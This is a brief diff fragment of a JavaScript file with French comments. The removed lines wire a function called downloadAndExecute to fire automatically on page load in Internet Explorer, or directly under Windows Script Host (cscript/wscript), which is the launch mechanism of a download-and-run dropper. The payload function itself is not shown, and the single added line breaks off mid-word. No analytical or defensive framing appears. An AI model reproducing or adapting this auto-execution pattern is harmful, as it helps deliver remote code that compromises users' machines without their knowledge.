@@ -66,13 +66,4 @@
     // Détection automatique de l'environnement
     if (typeof window !== 'undefined' && typeof window.addEventListener !== 'undefined') {
         // Environnement navigateur (Internet Explorer)
-        if (window.attachEvent) {
-            window.attachEvent('onload', downloadAndExecute);
-        } else {
-            window.addEventListener('load', downloadAndExecute);
-        }
-    } else {
-        // Environnement cscript/wscript
-        downloadAndExecute();
-    }
-})();
+        if (window.attachEve
